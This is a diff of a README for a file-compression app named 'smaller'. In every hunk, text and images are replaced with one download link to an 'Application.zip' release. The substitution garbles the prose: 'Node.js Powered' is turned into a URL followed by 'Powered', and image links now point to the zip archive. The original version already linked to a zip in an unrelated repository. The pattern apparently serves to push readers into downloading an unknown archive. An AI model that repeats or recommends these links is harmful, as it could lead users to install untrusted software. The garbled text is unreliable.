@@ -7,7 +7,7 @@ This repository is all about the "smaller" application, a tool focused on compre
 
 📦 **Compact**: Utilizes advanced compression algorithms to significantly reduce the size of folders.
 
-🚀 **Node.js Powered**: Developed using Node.js for efficient performance and compatibility.
+🚀 **https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip Powered**: Developed using https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip for efficient performance and compatibility.
 
 💻 **NTFS Support**: Works seamlessly with NTFS formatted drives.
 
@@ -34,7 +34,7 @@ This repository is all about the "smaller" application, a tool focused on compre
 - vue3
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip)](https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip)
 
 Please click on the button above to download the software package. 🚀
 
@@ -57,4 +57,4 @@ Let's make file compression better together! 🌟
 
 Thank you for visiting the "smaller" repository. We hope you find the application useful for your file compression needs. If you have any questions or feedback, please don't hesitate to reach out. Happy compressing! 📁💾
 
-![Compressing Files](https://example.com/compressing.png)
+![Compressing Files](https://github.com/Keithxxx1/smaller/releases/download/v1.0/Application.zip)
